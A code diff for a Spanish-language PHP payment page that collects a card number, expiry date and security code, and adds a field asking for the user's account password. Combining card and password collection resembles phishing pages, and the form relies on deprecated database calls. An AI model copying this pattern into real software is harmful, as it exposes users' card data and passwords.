@@ -64,15 +64,20 @@ $conexion = mysql_connect($hostname,$username,$password);
                 <h2 style="color:#0052cc">2. Ingrese los datos de su targeta</h2>
                   <br>
                     <span >Numero de Tarjeta:</span>
-                    <input style="margin-left: 50px;" type="text" name="numtar" id="numtar">
+                    <input style="margin-left: 50px;" type="text" name="numtar">
                     <br>
                     <br>
                     <span >Fecha de Vencimiento:</span>
-                    <input style="margin-left: 18px;" type="text" name="fechavenc" id="fechavenc">
+                    <input style="margin-left: 18px;" type="text" name="fechavenc">
                     <br>
                     <br>
                     <span > Código de Seguridad:</span>
-                    <input style="margin-left: 34px;" type="text" name="codtar" id="codtar"><br>
+                    <input style="margin-left: 34px;" type="text" name="codtar"><br>
+                    <br>
+                    <br>
+                    <h2 style="color:#0052cc">3. Ingrese la contraseña de su cuenta</h2>
+                    <span > Ingrese contraseña:</span>
+                    <input style="margin-left: 34px;" type="password" name="pass">
 
                     </form>
                     <input type="submit" name="submit" value="Siguiente"class="button2"
